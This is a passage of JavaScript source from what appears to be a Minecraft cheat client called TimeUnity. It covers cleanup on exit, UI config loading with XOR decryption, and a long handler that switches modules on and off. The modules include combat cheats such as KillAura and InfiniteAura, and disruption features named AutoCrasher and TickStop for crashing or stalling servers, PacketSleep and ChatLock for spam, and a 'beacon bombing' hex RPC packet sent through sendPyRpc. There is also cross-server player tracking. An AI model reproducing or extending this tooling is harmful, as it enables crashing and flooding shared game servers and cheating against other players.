        /* 回收搭路渲染框，避免脚本卸载后引擎仍持有已失效的 shape */
        try {
            for (let i = 0; i < Scaffold_Shapes.length; i++) {
                try { removeShape(Scaffold_Shapes[i].Shape_id); } catch (e2) { }
            }
            Scaffold_Shapes = [];
        } catch (e) { }
        try { if (AutoBox_History.length > 0) AutoBox_RemoveShape(); } catch (e) { }
        try { _camera.resetCamera(); } catch (e) { }
        try { removeText(FpsId); } catch (e) { }
        try { removeText(TextPos); } catch (e) { }
        const TU_Exit_Menus = ["TU战斗类", "TU移动类", "TU玩家类", "TU辅助类", "TU娱乐类", "TU渲染类", "TU原版类", "TU设置类", "TU开发类", "ChtransferMenu", "Global_InfiniteAura_Menu", "ParticleBoom_Menu", "用户登录", "用户注册", "TU账号列表", "TimeUnity"];
        for (let i = 0; i < TU_Exit_Menus.length; i++) {
            try { _menu.remove(TU_Exit_Menus[i]); } catch (e) { }
        }
        try { _app.showToast("已退出脚本"); } catch (e) { }
        /* 让清理先提交到引擎，再卸载脚本实例 */
        setTimeout(function () { try { exit(); } catch (e) { } }, 100);
    }, 0);
}

const Ftion = {
    exist: function(funcName) {
        try {
            return typeof eval(funcName) === 'function';
        } catch (e) {
            return false;
        }
    }
};
const Counter = {};
let ModuleTip_Python_Key = "False";

function ModuleTip(name, key) {
    const CounterName = `${name}_initial_Timing`;
    if (!Counter[CounterName]) {
        Counter[CounterName] = 0;
    }
    Counter[CounterName]++;
    if (Counter[CounterName] >= 2) {
        if (ModuleTip_Enabled) {
            if (ModuleTip_MessageTip) _minecraft.clientMessage(`§l§b[TimeUnity]§r §7>> §f${name} §7>> ${key ? '§l§aEnabled' : '§l§cDisabled'}`);
            if (key) ModuleTip_Python_Key = "True";
            if (!key) ModuleTip_Python_Key = "False";
            if (ModuleTip_GUITip) _app.evalPython(`from gui_2d import GUI
GUI.ui_mgr.show_toast(" ${name}", ${ModuleTip_Python_Key})`);
        }
    }
}

let main_title_colors = "";
let main_title_size = "";
let main_title_background = "";
let main_radius = "";
let main_alpha = "";
let main_padding = "";
let main_item_color = "";
let menu_item_child_color = "";
let menu_item_check_color = "";
let main_color = "";
let current_file_path = "";

try {
    let main_path = _app.getResource() + "/ui";
    current_file_path = main_path + "/ui_definition.json";
    let def_content = _fs.read(current_file_path);
    if (!def_content) throw "文件不存在或为空: " + current_file_path;
    let ui_definition;
    try {
        ui_definition = JSON.parse(def_content);
    } catch (e) {
        throw "JSON格式错误 [" + current_file_path + "]: " + e;
    }
    if (ui_definition.ui.length === 0) {
        main_path = _app.getResource() + "/ui/NatureUI";
        current_file_path = main_path + "/ui_definition.json";
        def_content = _fs.read(current_file_path);
        if (!def_content) throw "NatureUI定义文件不存在: " + current_file_path;
        try {
            ui_definition = JSON.parse(def_content);
        } catch (e) {
            throw "JSON格式错误 [" + current_file_path + "]: " + e;
        }
    }
    if (!_fs.exists(_app.getResource() + "/TimeUnity/UI.json")) _fs.write(_app.getResource() + "/TimeUnity/UI.json", JSON.stringify(UI_Config, null, 2));
    let config_content = _fs.read(_app.getResource() + "/TimeUnity/UI.json");
    if (config_content && JSON.parse(config_content).enable) {
        ui_definition.ui.forEach(ui => {
            try {
                current_file_path = main_path + "/" + ui + ".json";
                let ui_main_str = _fs.read(current_file_path);
                if (!ui_main_str) throw "子UI文件为空或读取失败: " + current_file_path;
                let ui_main;
                try {
                    if (ui_main_str.includes("{") && ui_main_str.includes("}")) {
                        ui_main = JSON.parse(ui_main_str);
                    } else {
                        let decrypted = XorDecrypt(ui_main_str, ui_definition.name);
                        ui_main = JSON.parse(decrypted);
                    }
                } catch (e) {
                    throw "解析失败 [" + current_file_path + "]: " + e;
                }
                if (!main_title_colors && ui_main.title?.colors) main_title_colors = ui_main.title.colors;
                if (!main_title_background && ui_main.title?.background) main_title_background = ui_main.title.background;
                if (!main_title_size && ui_main.title.size) main_title_size = ui_main.title.size;
                if (!main_radius && ui_main.radius) main_radius = ui_main.radius;
                if (!main_alpha && ui_main.alpha) main_alpha = ui_main.alpha;
                if (!main_color && ui_main.color) main_color = ui_main.color;

                if (ui_main.items) {
                    ui_main.items.forEach(item => {
                        if (!main_padding && item.type === "Switch" && item.padding) main_padding = item.padding;
                        if (!main_item_color && item.color && item.type === "Switch") main_item_color = item.color;
                        if (!menu_item_check_color && item.color && item.type === "CheckBox") menu_item_check_color = item.color;
                        if (!menu_item_check_color && item.items) {
                            item.items.forEach(items => {
                                if (!menu_item_check_color && items.color && items.type === "CheckBox") menu_item_check_color = items.color;
                            });
                        }
                        if (!menu_item_child_color && item.color && item.type === "TextView") menu_item_child_color = item.color;
                    });
                }
            } catch (error) {
                _minecraft.clientMessage("§a读取UI配色出现异常 原因: §c" + error);
            }
        });
    }
} catch (error) {
    _minecraft.clientMessage("§a解析UI时出现异常 原因: §c" + error);
}

function onCallModuleEvent(eventData) {
    try {
        for (const key in eventData) {
            if (key == 'value' || key == 'fun' || key == 'name' || key == 'index' || key == 'shortcut') continue;
            if (typeof eventData[key] === 'number' || typeof eventData[key] === 'boolean' || typeof eventData[key] === 'string') {
                try {
                    if (CheckLogin) {
                        if (key == "KillAura") {
                            if (!eventData[key] && KillAura_silentRot) TU_ResetCamera();
                            KillAura_Enabled = eventData[key];
                            addCustomArrayList("KillAura", '杀戮光环', '杀戮光环', eventData[key]);
                            ModuleTip("KillAura", eventData[key]);
                        }
                        if (key == "KillAura_Mode_player") {
                            KillAura_Mode_Player = eventData[key];
                        }
                        if (key == "KillAura_Mode_mob") {
                            KillAura_Mode_mob = eventData[key];
                        }
                        if (key == "KillAura_SilentMode") {
                            KillAura_SilentMode = eventData[key];
                        }
                        if (key == "KillAura_Throwing") {
                            KillAura_Throwing = eventData[key];
                        }
                        if (key == "KillAura_CutSword") {
                            KillAura_CutSword = eventData[key];
                        }
                        if (key == "KillAura_NotCutSword") {
                            KillAura_NotCutSword = eventData[key];
                        }
                        if (key == "AttackInvisible") {
                            AttackInvisible = eventData[key];
                        }
                        if (key == "KillAura_Atacked") {
                            KillAura_Atacked = eventData[key];
                        }
                        if (key == "KillAura_Transferred") {
                            KillAura_Transferred = eventData[key];
                        }
                        if (key == "KillAura_health") {
                            KillAura_health = eventData[key];
                        }
                        if (key == "KillAura_PacketRot") {
                            KillAura_PacketRot = eventData[key];
                        }
                        if (key == "KillAura_silentRot") {
                            KillAura_silentRot = eventData[key];
                            if (!KillAura_silentRot) TU_ResetCamera();
                        }
                        if (key == "KillAura_ECAttack") {
                            KillAura_ECAttack = eventData[key];
                        }
                        if (key == "KillAura_BlackList_Enabled") {
                            KillAura_BlackList_Enabled = eventData[key];
                        }
                        if (key == "KillAura_WhiteList_Enabled") {
                            KillAura_WhiteList_Enabled = eventData[key];
                        }
                        if (key == "KillAura_WhiteList") {
                            KillAura_WhiteList = eventData[key].split(',').map(name => name.trim()).filter(name => name !== '');
                        }
                        if (key == "KillAura_BlackList") {
                            KillAura_BlackList = eventData[key].split(',').map(name => name.trim()).filter(name => name !== '');
                        }
                        if (key == "Swing") {
                            Swing = eventData[key];
                        }
                        if (key == "checkCollision") {
                            checkCollision = eventData[key];
                        }
                        if (key == "KillAura_CPS") {
                            KillAura_CPS = Number(eventData[key]);
                        }
                        if (key == "KillAura_Range") {
                            KillAura_Range = Number(eventData[key]);
                        }
                        if (key == "KillAura_FOV") {
                            KillAura_FOV = Number(eventData[key]);
                        }
                        if (key == "KillAura_MaxTarget") {
                            KillAura_MaxTarget = Number(eventData[key]);
                        }
                        if (key == "KillAura_Undercut") {
                            KillAura_Undercut = Number(eventData[key]);
                        }
                        if (key == "AntiBot") {
                            AntiBot = eventData[key];
                            ModuleTip("AntiBot", eventData[key]);
                            addCustomArrayList("AntiBot", '反假人', '反假人', eventData[key]);
                        }
                        if (key == "shouldDelete") {
                            shouldDelete = eventData[key];
                        }
                        if (key == "AntiAntiBot") {
                            AntiAntiBot_Enabled = eventData[key];
                            ModuleTip("AntiAntiBot", eventData[key]);
                            addCustomArrayList("AntiAntiBot", '反反假人', '反反假人', eventData[key]);
                        }
                        if (eventData["AirHand"] == true) {
                            AirHand = true;
                            addCustomArrayList("AirHand", '悬浮手', '悬浮手', true);
                            ModuleTip("AirHand", AirHand);
                        }
                        if (eventData["AirHand"] == false) {
                            AirHand = false;
                            callModule(38, JSON.stringify({
                                scale: true,
                                scale_x: 0.820,
                                scale_y: 0.680,
                                scale_z: AirHand_fov / 100,
                                value: false
                            }));
                            addCustomArrayList("AirHand", '悬浮手', '悬浮手', false);
                            ModuleTip("AirHand", AirHand);
                        }
                        if (key == "AirHand_fov") {
                            AirHand_fov = eventData[key];
                        }
                        if (key == "Critical") {
                            Critical_Enabled = eventData[key];
                            ModuleTip("Critical", eventData[key]);
                            addCustomArrayList("Critical", '刀刀暴击', '刀刀暴击', eventData[key]);
                        }
                        if (key == "Critical_BJDMode") {
                            Critical_BJDMode = eventData[key];
                        }
                        if (key == "InfiniteAura") {
                            InfiniteAura_Enabled = eventData[key];
                            ModuleTip("InfiniteAura", eventData[key]);
                            addCustomArrayList("InfiniteAura", '百米大刀', '百米大刀', eventData[key]);
                        }
                        if (eventData["InfiniteAura_choice"] == "InfiniteAura_group") {
                            InfiniteAura_Group_Enabled = true;
                            InfiniteAura_Monomer_Enabled = false;
                        }
                        if (eventData["InfiniteAura_choice"] == "InfiniteAura_monomer") {
                            InfiniteAura_Group_Enabled = false;
                            InfiniteAura_Monomer_Enabled = true;;
                        }
                        if (key == "InfiniteAura_TPClick") {
                            InfiniteAura_TPClick = eventData[key];
                        }
                        if (key == "InfiniteAura_ReturnPacket") {
                            InfiniteAura_ReturnPacket = eventData[key];
                        }
                        if (key == "InfiniteAura_ReturnClick") {
                            InfiniteAura_ReturnClick = eventData[key];
                        }
                        if (key == "NodeMode") {
                            NodeMode = eventData[key];
                        }
                        if (key == "HYT_Config") {
                            HYT_Config = eventData[key];
                        }
                        if (key == "BJD_Mode") {
                            BJD_Mode = eventData[key];
                        }
                        if (key == "InfiniteAura_BJDMode_Reconnect") {
                            InfiniteAura_BJDMode_Reconnect = eventData[key];
                        }
                        if (key == "InfiniteAura_swing") {
                            InfiniteAura_swing = eventData[key];
                        }
                        if (key == "InfiniteAura_BlackList_Enabled") {
                            InfiniteAura_BlackList_Enabled = eventData[key];
                        }
                        if (key == "InfiniteAura_WhiteList_Enabled") {
                            InfiniteAura_WhiteList_Enabled = eventData[key];
                        }
                        if (key == "InfiniteAura_WhiteList") {
                            InfiniteAura_WhiteList = eventData[key].split(',').map(name => name.trim()).filter(name => name !== '');
                        }
                        if (key == "InfiniteAura_BlackList") {
                            InfiniteAura_BlackList = eventData[key].split(',').map(name => name.trim()).filter(name => name !== '');
                        }
                        if (key == "AttackEntity") {
                            InfiniteAura_Entity_Enabled = eventData[key];
                        }
                        if (key == "AttackPlayer") {
                            InfiniteAura_Player_Enabled = eventData[key];
                        }
                        if (key == "InfiniteAura_Range") {
                            InfiniteAura_MaxRange = Number(eventData[key]);
                        }
                        if (key == "InfiniteAura_Interval") {
                            InfiniteAura_Interval = Number(eventData[key]);
                        }
                        if (key == "MinYHitbox") {
                            MinYHitbox = Number(eventData[key]);
                        }
                        if (key == "MinXHitbox") {
                            MinXHitbox = Number(eventData[key]);
                        }
                        if (key == "InfiniteAura_Delay") {
                            InfiniteAura_Delay = Number(eventData[key]);
                        }
                        if (key == "InfiniteAura_TeleCount") {
                            InfiniteAura_TeleCount = Number(eventData[key]);
                        }
                        if (key == "InfiniteAura_AtkStats") {
                            InfiniteAura_AtkStats = Number(eventData[key]);
                        }
                        if (key == "MaxTarget") {
                            MaxTarget = Number(eventData[key]);
                        }
                        if (key == "Scaffold") {
                            Scaffold_Enabled = eventData[key];
                            addCustomArrayList("Scaffold", '自动搭路', '自动搭路', Scaffold_Enabled);
                            ModuleTip("Scaffold", eventData[key]);
                        }
                        if (key == "Scaffold_AutoBuild") {
                            Scaffold_AutoBuild = eventData[key];
                        }
                        if (key == "Scaffold_SilentMode") {
                            Scaffold_SilentMode = eventData[key];
                        }
                        if (key == "Scaffold_RenderBox") {
                            Scaffold_RenderBox = eventData[key];
                        }
                        if (key == "Scaffold_BypasEC") {
                            Scaffold_BypasEC = eventData[key];
                        }
                        if (key == "Scaffold_MoveJump") {
                            Scaffold_MoveJump = eventData[key];
                        }
                        if (key == "Scaffold_FakeBlock") {
                            Scaffold_FakeBlock = eventData[key];
                        }
                        if (key == "Scaffold_BJDSpeed") {
                            Scaffold_BJDSpeed = eventData[key];
                        }
                        if (key == "Scaffold_Speed") {
                            Scaffold_Speed = eventData[key];
                        }
                        if (key == "Scaffold_LockY") {
                            Scaffold_LockY = eventData[key];
                        }
                        if (key == "Scaffold_Detection_Range") {
                            Scaffold_Detection_Range = Number(eventData[key]);
                        }
                        if (key == "Scaffold_length") {
                            Scaffold_length = Number(eventData[key]);
                        }
                        if (key == "invManager") {
                            invManager_Enabled = eventData[key];
                            _minecraft.sendChatMessage("[TimeUnity] invManager_closeContainer");
                            addCustomArrayList("invManager", '背包整理', '背包整理', eventData[key]);
                            ModuleTip("invManager", eventData[key]);
                        }
                        if (key == "AutoArmor") {
                            AutoArmor = eventData[key];
                        }
                        if (key == "Move_Weapon") {
                            Move_Weapon = eventData[key];
                        }
                        if (key == "Drop_Items") {
                            Drop_Items = eventData[key];
                        }
                        if (key == "Drop_Bow") {
                            Drop_Bow = eventData[key];
                        }
                        if (key == "invManager_inventory") {
                            invManager_inventory = eventData[key];
                        }
                        if (key == "invManager_chest") {
                            invManager_chest = eventData[key];
                        }
                        if (key == "invManager_Silence") {
                            invManager_Silence = eventData[key];
                        }
                        if (key == "invManager_Automatic") {
                            invManager_Automatic = eventData[key];
                        }
                        if (key == "invManager_Delay") {
                            invManager_Delay = Number(eventData[key]);
                        }
                        if (key == "invManager_SlotQuantity") {
                            invManager_SlotQuantity = Number(eventData[key]);
                        }
                        if (key == "invManager_DropQuantity") {
                            invManager_DropQuantity = Number(eventData[key]);
                        }
                        if (key == "ServerChecker") {
                            ServerChecker_Enabled = eventData[key];
                            if (!ServerChecker_Enabled) {
                                ServerChecker_Server = "";
                                ServerChecker_IP = "";
                            }
                            addCustomArrayList("ServerChecker", '玩家追踪', '玩家追踪', eventData[key]);
                            ModuleTip("ServerChecker", eventData[key]);
                        }
                        if (key == "ServerChecker_UID" && eventData[key] !== '') {
                            ServerChecker_UID = eventData[key];
                            ServerChecker_Server = "";
                        }
                        if (key == "ServerChecker_Crasher") {
                            ServerChecker_Crasher = eventData[key];
                        }
                        if (key == "BackTrack") {
                            if (!eventData[key] && BackTrack_Tick > 0) BackTrack_Attack = false;
                            BackTrack_Enabled = eventData[key];
                            addCustomArrayList("BackTrack", '攻击回溯', '攻击回溯', eventData[key]);
                            ModuleTip("BackTrack", eventData[key]);
                        }
                        if (key == "BackTrack_Tick") {
                            BackTrack_Tick = Number(eventData[key]);
                        }
                        if (key == "AntiVoid") {
                            AntiVoid_Enabled = eventData[key];
                            addCustomArrayList("AntiVoid", '虚空回弹', '虚空回弹', eventData[key]);
                            ModuleTip("AntiVoid", eventData[key]);
                        }
                        if (key == "AntiVoid_Rebound") {
                            AntiVoid_Rebound = eventData[key];
                        }
                        if (key == "AntiVoid_Block") {
                            AntiVoid_Block = eventData[key];
                        }
                        if (key == "AntiVoid_Speed") {
                            AntiVoid_Speed = Number(eventData[key]);
                        }
                        if (key == "ModifyTime") {
                            if (!_app.isInGame()) return;
                            ModifyTime_WorldData = getWorldData();
                            ModifyTime = eventData[key];
                            ModuleTip("ModifyTime", eventData[key]);
                            addCustomArrayList("ModifyTime", '时间修改', '时间修改', eventData[key]);
                        }
                        if (key == "ModifyTime_Time") {
                            ModifyTime_Time = Number(eventData[key]);
                        }
                        if (eventData["ModifyTime"] == false) {
                            if (!_app.isInGame()) return;
                            setWorldData({
                                time: ModifyTime_WorldData.time,
                                rainTime: 0,
                                rainLevel: 0
                            });
                        }
                        if (key == "ModifyRain") {
                            ModifyRain = eventData[key];
                        }
                        if (key == "WelCome") {
                            WelCome_Enabled = eventData[key];
                            addCustomArrayList("Welcome", '自我介绍', '自我介绍', eventData[key]);
                            ModuleTip("WelCome", eventData[key]);
                        }
                        if (eventData.WelCome_Text != null && eventData.WelCome_Text != undefined && eventData.WelCome_Text !== '') {
                            WelCome_Text = eventData.WelCome_Text;
                        }
                        if (key == "GodMode") {
                            GodMode_Enabled = eventData[key];
                            addCustomArrayList("GodMode", '上帝模式', '上帝模式', eventData[key]);
                            ModuleTip("GodMode", eventData[key]);
                        }
                        if (key == "GodMode_RandomHeight") {
                            GodMode_RandomHeight = eventData[key];
                        }
                        if (key == "GodMode_Vertical") {
                            GodMode_Vertical = eventData[key];
                        }
                        if (key == "GodMode_PickUp") {
                            GodMode_PickUp = eventData[key];
                        }
                        if (key == "GodMode_Teleport") {
                            GodMode_Teleport = Number(eventData[key]);
                        }
                        if (key == "GodMode_TP_height") {
                            GodMode_TP_height = Number(eventData[key]);
                        }
                        if (key == "GodMode_TP_Vertical") {
                            GodMode_TP_Vertical = Number(eventData[key]);
                        }
                        if (key == "Hammer") {
                            Hammer_Enabled = eventData[key];
                            addCustomArrayList("Hammer", '重锤秒杀', '重锤秒杀', eventData[key]);
                            ModuleTip("Hammer", eventData[key]);
                        }
                        if (key == "AttackHeight") {
                            Hammer_AttackHeight = Number(eventData[key]);
                        }
                        if (key == "AttackStep") {
                            Hammer_AttackStep = Number(eventData[key]);
                        }
                        if (key == "CrystalAura") {
                            CrystalAura_Enabled = eventData[key];
                            addCustomArrayList("CrystalAura", '水晶光环', '水晶光环', eventData[key]);
                            ModuleTip("CrystalAura", eventData[key]);
                        }
                        if (key == "CrystalAura_AttackEntity") {
                            CrystalAura_AttackEntity = eventData[key];
                        }
                        if (key == "CrystalAura_AttackCrystal") {
                            CrystalAura_AttackCrystal = eventData[key];
                        }
                        if (key == "CrystalAura_Range") {
                            CrystalAura_Range = Number(eventData[key]);
                        }
                        if (key == "BowTrack") {
                            BowTrack_Enabled = eventData[key];
                            addCustomArrayList("BowTrack", '弓箭追踪', '弓箭追踪', eventData[key]);
                            ModuleTip("BowTrack", eventData[key]);
                        }
                        if (key == "BowTrack_Player") {
                            BowTrack_Player = eventData[key];
                        }
                        if (key == "BowTrack_Entity") {
                            BowTrack_Entity = eventData[key];
                        }
                        if (eventData["setCamera"] == true) {
                            setCamera_Enabled = true;
                            addCustomArrayList("setCamera", '修改相机', '修改相机', true);
                            ModuleTip("setCamera", setCamera_Enabled);
                        }
                        if (eventData["setCamera"] == false) {
                            setCamera_Enabled = false;
                            setCameraOffset(0, 0, 0);
                            addCustomArrayList("setCamera", '修改相机', '修改相机', false);
                            ModuleTip("setCamera", setCamera_Enabled);
                        }
                        if (key == "CameraX") {
                            CameraX = Number(eventData[key]);
                        }
                        if (key == "CameraY") {
                            CameraY = Number(eventData[key]);
                        }
                        if (key == "CameraZ") {
                            CameraZ = Number(eventData[key]);
                        }
                        if (eventData["MoveCamera"] == true) {
                            MoveCamera_Enabled = true;
                            addCustomArrayList("MoveCamera", '运动相机', '运动相机', true);
                            ModuleTip("MoveCamera", MoveCamera_Enabled);
                        }
                        if (eventData["MoveCamera"] == false) {
                            MoveCamera_Enabled = false;
                            setCameraAnchor(0, 0, 0);
                            addCustomArrayList("MoveCamera", '运动相机', '运动相机', false);
                            ModuleTip("MoveCamera", MoveCamera_Enabled);
                        }
                        if (key == "Amplitu") {
                            Amplitu = Number(eventData[key]);
                        }
                        if (key == "MegaTop") {
                            _camera.resetCamera();
                            MegaTop_Enabled = eventData[key];
                            addCustomArrayList("MegaTop", '大陀螺', '大陀螺', eventData[key]);
                            ModuleTip("MegaTop", eventData[key]);
                        }
                        if (eventData["MegaTopMode"] == "head") {
                            MegaTop_head = true;
                            MegaTop_Headless = false;
                        }
                        if (eventData["MegaTopMode"] == "Headless") {
                            MegaTop_Headless = true;
                            MegaTop_head = false;
                        }
                        if (key == "MegaTop_Speed") {
                            MegaTop_Speed = Number(eventData[key]);
                        }
                        if (key == "ChatLock") {
                            ChatLock_Enabled = eventData[key];
                            addCustomArrayList("ChatLock", '聊天卡人', '聊天卡人', eventData[key]);
                            ModuleTip("ChatLock", eventData[key]);
                        }
                        if (eventData["ChatLock_Option"] == "ChatLock_Whole") {
                            ChatLock_Whole = true;
                            ChatLock_Attack = false;
                        }
                        if (eventData["ChatLock_Option"] == "ChatLock_Attack") {
                            ChatLock_Whole = false;
                            ChatLock_Attack = true;
                        }
                        if (eventData["ChatLock_Option"] == "ChatLock_Player") {
                            ChatLock_Whole = false;
                            ChatLock_Attack = false;
                            ChatLock_Time++
                            if (ChatLock_Time < 2) return;
                            if (_app.isInGame()) ChatLock_Name = getPlayerNameList();
                            const ChatLock_List = `{
                                "type": "custom_form",
                                "title": "选择玩家",
                                "content": [{
                                    "type": "dropdown",
                                    "text": "添加目标",
                                    "options": ` + JSON.stringify(ChatLock_Name) + `
                                },
                                {
                                    "type": "dropdown",
                                    "text": "移除目标",
                                    "options": ` + JSON.stringify(getPlayerNameChatList()) + `
                                }]
                            }`
                            _gui.addForm(ChatLock_List, function(add, remove) {
                                if (add !== 0 && !ChatLock_add.includes(ChatLock_Name[add])) {
                                    ChatLock_add.push(ChatLock_Name[add]);
                                }
                                if (remove !== 0) {
                                    ChatLock_add.splice(ChatLock_add.indexOf(getPlayerNameChatList()[remove]), 1);
                                }
                            });
                        }
                        if (key == "AutoBreak") {
                            AutoBreak_Enabled = eventData[key];
                            addCustomArrayList("AutoBreak", '自动破坏', '自动破坏', eventData[key]);
                            ModuleTip("AutoBreak", eventData[key]);
                        }
                        if (key == "AutoBreak_Range") {
                            AutoBreak_Range = Number(eventData[key]);
                        }
                        if (key == "AutoBreak_Interval") {
                            AutoBreak_Interval = Number(eventData[key]);
                        }
                        if (key == "AntiStarve") {
                            AntiStarve_Enabled = eventData[key];
                            addCustomArrayList("AntiStarve", '无视饥饿', '无视饥饿', eventData[key]);
                            ModuleTip("AntiStarve", eventData[key]);
                        }
                        if (key == "SummonFox") {
                            SummonFox_Enabled = eventData[key];
                            addCustomArrayList("SummonFox", '召唤狐狸', '召唤狐狸', eventData[key]);
                            ModuleTip("SummonFox", eventData[key]);
                        }
                        if (key == "SummonFox_Speed") {
                            SummonFox_Speed = Number(eventData[key]);
                        }
                        if (key == "LockNight") {
                            LockNight_Enabled = eventData[key];
                            addCustomArrayList("LockNight", '锁定夜视', '锁定夜视', eventData[key]);
                            ModuleTip("LockNight", eventData[key]);
                        }
                        if (key == "AutoTool") {
                            AutoTool_Enabled = eventData[key];
                            addCustomArrayList("AutoTool", '自动工具', '自动工具', eventData[key]);
                            ModuleTip("AutoTool", eventData[key]);
                        }
                        if (key == "AttackESP") {
                            AttackESP_Enabled = eventData[key];
                            addCustomArrayList("AttackESP", '攻击绘制', '攻击绘制', eventData[key]);
                            ModuleTip("AttackESP", eventData[key]);
                        }
                        if (key == "AttackESP_length") {
                            AttackESP_length = Number(eventData[key]);
                        }
                        if (key == "AttackLightning") {
                            AttackLightning_Enabled = eventData[key];
                            addCustomArrayList("AttackLightning", '攻击闪电', '攻击闪电', eventData[key]);
                            ModuleTip("AttackLightning", eventData[key]);
                        }
                        if (key == "AttackLightning_Sound") {
                            AttackLightning_Sound = eventData[key];
                        }
                        if (eventData["Beacon_Packet"] == true) {
                            sendPyRpc(98247598, `93c401729209c4294d696e6563726166743a7065743a7065745f736b696c6c5f6e6f746966795f6164645f626561636f6ec0`);
                            Beacon_Packet_Enabled = true;
                            ModuleTip("Beacon_Packet", Beacon_Packet_Enabled);
                            addCustomArrayList("Beacon_Packet", '信标轰炸', '信标轰炸', true);
                        }
                        if (eventData["Beacon_Packet"] == false) {
                            Beacon_Packet_Enabled = false;
                            addCustomArrayList("Beacon_Packet", '信标轰炸', '信标轰炸', false);
                            ModuleTip("Beacon_Packet", Beacon_Packet_Enabled);
                        }
                        if (key == "Packet_Speed") {
                            Beacon_Speed = Number(eventData[key]);
                        }
                        if (key == "Beacon_Packet_Block") {
                            Beacon_Packet_Block = eventData[key];
                        }
                        if (key == "CmdFile") {
                            CmdFile_Enabled = eventData[key];
                            addCustomArrayList("CmdFile", '执行命令', '执行命令', eventData[key]);
                            ModuleTip("CmdFile", eventData[key]);
                        }
                        if (key == "CmdBoost") {
                            CmdBoost = Number(eventData[key]);
                        }
                        if (key == "AutoRC") {
                            AutoRC_Enabled = eventData[key];
                            addCustomArrayList("AutoRC", '自动重连', '自动重连', eventData[key]);
                            ModuleTip("AutoRC", eventData[key]);
                        }
                        if (key == "AutoRC_Text") {
                            AutoRC_Text = eventData[key].replace(/:/g, ' ');
                        }
                        if (key == "AutoRC_IP_Time") {
                            AutoRC_IP_Time = Number(eventData[key]);
                        }
                        if (key == "TickStop") {
                            TickStop_Enabled = eventData[key];
                            addCustomArrayList("TickStop", '一键卡服', '一键卡服', eventData[key]);
                            ModuleTip("TickStop", eventData[key]);
                        }
                        if (key == "TickStop_Delay") {
                            TickStop_Delay = Number(eventData[key]);
                        }
                        if (eventData["TickStop_Mode"] == "TickStop_Mode_1") {
                            TickStop_Mode = 1;
                        }
                        if (eventData["TickStop_Mode"] == "TickStop_Mode_0") {
                            TickStop_Mode = 0;
                        }
                        if (key == "PacketSleep") {
                            PacketSleep_Enabled = eventData[key];
                            addCustomArrayList("PacketSleep", '睡觉刷屏', '睡觉刷屏', eventData[key]);
                            ModuleTip("PacketSleep", eventData[key]);
                        }
                        if (key == "PacketSleep_Speed") {
                            PacketSleep_Speed = Number(eventData[key]);
                        }
                        if (key == "AutoCrasher") {
                            AutoCrasher_Enabled = eventData[key];
                            if (AutoCrasher_Enabled) AutoCrasher_Time = 400;
                            addCustomArrayList("AutoCrasher", '自动崩服', '自动崩服', eventData[key]);
                            ModuleTip("AutoCrasher", eventData[key]);
                        }
                        if (key == "AutoCrasher_Text") {
                            AutoCrasher_Text = eventData[key];
                        }
                        if (key == "AntiTP") {
                            AntiTP_Enabled = eventData[key];
                            addCustomArrayList("AntiTP", '反传送', '反传送', eventData[key]);
                            ModuleTip("AntiTP", eventData[key]);
                        }
                        if (key == "AcrossLevelTrade") {
                            AcrossLevelTrade_Enabled = eventData[key];
                            addCustomArrayList("AcrossLevelTrade", '跨等级交易', '跨等级交易', eventData[key]);
                            ModuleTip("AcrossLevelTrade", eventData[key]);
                        }
                        if (key == "Anvil_NewLine") {
                            Anvil_NewLine_Enabled = eventData[key];
                            addCustomArrayList("Anvil_NewLine", '铁砧换行', '铁砧换行', eventData[key]);
                            ModuleTip("Anvil_NewLine", eventData[key]);
                        }
                        if (key == "NoOnlineKick") {
                            NoOnlineKick_Enabled = eventData[key];
                            if (NoOnlineKick_Enabled && _app.isInGame()) NoOnlineKick_Game();
                            if (!NoOnlineKick_Enabled) {
                                if (NoOnlineKick_LobbyGame !== null) {
                                    curl_post_game_api("https://g79apigatewayobt.minecraft.cn/online-lobby-room-enter/", JSON.stringify({
                                        "password": "",
                                        "room_id": NoOnlineKick_LobbyGame,
                                        "lobby_manifest_version": "",
                                        "check_visibilily": 1
                                    }), function(code, response) {
                                        NoOnlineKick_LobbyGame = null;
                                    });
                                }
                            }
                            addCustomArrayList("NoOnlineKick", '联机防踢', '联机防踢', eventData[key]);
                            ModuleTip("NoOnlineKick", eventData[key]);
                        }
                        if (key == "ChestStealer") {
                            ChestStealer_Enabled = eventData[key];
                            addCustomArrayList("ChestStealer", '箱子小偷', '箱子小偷', eventData[key]);
                            ModuleTip("ChestStealer", eventData[key]);
                        }
                        if (key == "ChestStealer_Delay") {
                            ChestStealer_Delay = Number(eventData[key]);
                        }
                        if (key == "ChestStealer_Quantity") {
                            ChestStealer_Quantity = Number(eventData[key]);
                        }
                        if (key == "ChestStealer_Automatic") {
                            ChestStealer_Automatic = eventData[key];
                        }
                        if (key == "ChestStealer_SilentMode") {
                            ChestStealer_SilentMode = eventData[key];
                        }
                        if (key == "AutoBox") {
                            AutoBox_Enabled = eventData[key];
                            addCustomArrayList("AutoBox", '自动开箱', '自动开箱', eventData[key]);
                            ModuleTip("AutoBox", eventData[key]);
                        }
                        if (key == "AutoBox_RenderShape") {
                            AutoBox_RenderShape = eventData[key];
                        }
                        if (key == "AutoBox_Range") {
                            AutoBox_Range = Number(eventData[key]);
                        }
                        if (key == "AutoDestroyBed") {
                            AutoDestroyBed_Enabled = eventData[key];
                            addCustomArrayList("AutoDestroyBed", '自动挖床', '自动挖床', eventData[key]);
                            ModuleTip("AutoDestroyBed", eventData[key]);
                        }
                        if (key == "AutoDestroyBed_Range") {
                            AutoDestroyBed_Range = Number(eventData[key]);
                        }
                        if (eventData["EnchantMod"] == true) {
                            EnchantMod_Enabled = true;
                            addCustomArrayList("EnchantMod", '附魔修改', '附魔修改', true);
                            ModuleTip("EnchantMod", EnchantMod_Enabled);
                        }
                        if (eventData["EnchantMod"] == false) {
                            EnchantMod_Enabled = false;
                            _i18n.setString("enchantment.level.5", "V");
                            _i18n.setString("enchantment.level.4", "IV");
                            _i18n.setString("enchantment.level.3", "III");
                            _i18n.setString("enchantment.level.2", "II");
                            _i18n.setString("enchantment.level.1", "I");
                            addCustomArrayList("EnchantMod", '附魔修改', '附魔修改', false);
                            ModuleTip("EnchantMod", EnchantMod_Enabled);
                        }
                        if (key == "EnchantMod_Level") {
                            EnchantMod_Level = Number(eventData[key]);
                        }
                        if (key == "SpeedDestroy") {
                            SpeedDestroy_Enabled = eventData[key];
                            addCustomArrayList("SpeedDestroy", '快速挖掘', '快速挖掘', eventData[key]);
                            ModuleTip("SpeedDestroy", eventData[key]);
                        }
                        if (key == "SpeedDestroy_Speed") {
                            SpeedDestroy_Speed = Number(eventData[key]);
                        }
                        if (key == "AnvilDamage") {
